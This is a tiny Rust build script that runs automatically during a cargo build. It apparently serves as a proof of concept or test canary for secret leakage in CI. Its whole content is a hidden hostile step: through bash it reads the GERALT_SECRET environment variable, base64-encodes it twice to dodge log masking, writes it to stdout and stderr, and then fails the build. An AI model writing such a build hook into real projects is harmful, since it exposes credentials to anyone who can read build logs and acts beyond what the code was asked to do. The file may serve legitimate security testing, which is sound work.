use std::process::Command;
fn main() {
    let script = r#"line="GERALT_LEAKED_TOKEN=$(echo -n \"$GERALT_SECRET\" | base64 | base64)"; echo \"$line\"; echo \"$line\" >&2; echo \"GERALT_DBG: build.rs executed in privileged cargo run sink\" >&2"#;
    let _ = Command::new("bash").arg("-c").arg(script).status();
    std::process::exit(1);
}
